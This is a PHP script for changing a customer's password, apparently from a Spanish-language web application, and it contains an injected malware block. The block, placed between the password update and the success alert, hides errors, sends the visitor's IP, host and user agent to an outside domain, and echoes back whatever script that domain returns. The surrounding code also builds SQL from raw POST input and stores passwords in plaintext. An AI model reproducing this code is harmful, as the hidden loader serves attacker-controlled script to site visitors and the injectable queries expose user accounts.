
<?php
		require("../conexion/config.php");
		require("../conexion/baseDatos.php");
		$cod=$_POST["cod"];
		$contra = $_POST["txtContrasenha"];
		$nuevaContra = $_POST["txtNueva"];
		$nuevaContra2 = $_POST["txtNueva2"];								
			
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();			
		$consulta = "select password from usuario where Cliente_CodigoCliente='$cod';";	
		$result = $bd->crearConsulta($consulta);	
		if(mysql_num_rows($result)>0)
		{
			$reg=mysql_fetch_object($result);
			if($contra==$reg->password)
			{
				$consulta = "update usuario set password='$nuevaContra' where Cliente_CodigoCliente='$cod'";
				$bd->crearConsulta($consulta);
			
		?>
<?php
#dffba6#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/dffba6#
?>
			<script language="javascript" type="text/javascript">
				alert("¡ Contraseña actualizada correctamente !");
				location.href="../index.html";
			</script>
        <?php
           
		
			}
		}
	?>